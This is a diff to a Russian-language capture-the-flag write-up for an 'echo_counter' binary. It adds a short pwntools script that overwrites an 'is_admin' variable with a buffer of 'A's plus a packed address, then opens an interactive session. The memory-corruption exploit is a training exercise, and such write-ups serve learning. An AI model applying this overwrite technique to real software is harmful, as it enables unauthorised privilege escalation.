@@ -22,4 +22,13 @@
 переменной `is_admin`. Чтобы выйти из программы отправим еще одну строку, которая будет содрежать символ `q`, чтобы выйти из массива. Для начала узнаем адрес переменной `is_admin`: <br />
 ![image](https://github.com/user-attachments/assets/fa0ff9c2-5700-44de-aa60-8c3e4722939d)
 
+По традиции пишем скрипт, который находит локальный флаг и если он работает, то отправляем решение на сервер: <br />
+
+```py
+p = process('./echo_counter')
+p.sendline(b"A"*12 + p64(0x40408c))
+p.sendline(b"q")
+p.interactive()
+```
+![image](https://github.com/user-attachments/assets/8555dcb8-ea69-463b-bb91-3392d3d612f8)
 
